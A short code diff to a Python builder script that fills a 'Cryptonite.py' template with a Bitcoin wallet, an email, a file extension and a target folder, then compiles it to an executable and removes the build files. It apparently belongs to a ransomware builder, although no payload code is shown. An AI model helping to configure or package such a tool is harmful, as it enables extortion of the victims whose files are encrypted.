@@ -30,7 +30,7 @@ def generate():
         "BTC_WALLET": btcw_entry.get(),
         "EMAIL": email_entry.get(),
         "EXT": ext_entry.get().replace(".", ""),
-        "FOLDER": folder1_entry.get().strip()
+        "FOLDER": folder1_entry.get().strip().replace("\\", "/")
     }
     with open("Cryptonite.py", "r") as f:
         text = f.read()
@@ -46,11 +46,11 @@ def generate():
     if OS == "nt":
         os.system(f"MOVE /Y \".\\dist\\{FILE}.exe\" \"{PATH}\" && rmdir /Q /S __pycache__ build dist && del /Q {FILE}.spec")
     else:
-        os.system(f"mv /dist/{FILE}.exe ./")
+        os.system(f"mv ./dist/{FILE} /\"{PATH}\"/")
         os.system(f"rm -r __pycache__")
         os.system(f"rm -r build")
         os.system(f"rm -r dist")
-        os.system(f"{FILE}.spec")
+        os.system(f"rm -r {FILE}.spec")
     exit(0)
 
 
